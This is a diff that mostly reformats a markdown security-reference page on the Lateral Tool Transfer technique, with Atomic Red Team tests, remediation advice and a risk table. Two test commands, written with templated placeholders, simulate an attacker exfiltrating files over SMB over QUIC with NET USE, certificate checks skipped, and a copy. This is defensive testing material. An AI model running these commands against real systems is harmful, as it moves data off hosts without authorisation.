@@ -30,10 +30,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-284
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -72,9 +70,10 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 
 Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
 Prerequisites:
-  - A file server running Windows Server 2022 Datacenter: Azure Edition
-  - A Windows 11 computer
-  - Windows Admin Center
+
+- A file server running Windows Server 2022 Datacenter: Azure Edition
+- A Windows 11 computer
+- Windows Admin Center
 
 **Supported Platforms:** windows
 **Elevation Required:** Yes
@@ -88,9 +87,10 @@ copy '#{local_file}' 'Z:\'
 
 Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
 Prerequisites:
-  - A file server running Windows Server 2022 Datacenter: Azure Edition
-  - A Windows 11 computer
-  - Windows Admin Center
+
+- A file server running Windows Server 2022 Datacenter: Azure Edition
+- A Windows 11 computer
+- Windows Admin Center
 
 **Supported Platforms:** windows
 **Elevation Required:** Yes
@@ -99,7 +99,6 @@ Prerequisites:
 NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
 copy '#{local_file}' '*:\'
 ```
-
 
 ### Manual Testing
 
@@ -114,29 +113,28 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1037 Filter Network Traffic
+
 Consider using the host firewall to restrict file sharing communications such as SMB.
 
 ### M1031 Network Intrusion Prevention
-Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions.
 
+Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions.
 
 ## Detection
 
 ### Detection Strategy for Lateral Tool Transfer across OS platforms
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Lateral Tool Transfer technique applicable | Low | Lateral Movement |
+| Finding                                    | Severity | Impact           |
+| ------------------------------------------ | -------- | ---------------- |
+| Lateral Tool Transfer technique applicable | Low      | Lateral Movement |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                   |
+| ------- | ----------------------- |
 | CWE-284 | Improper Access Control |
-
 
 ## References
 
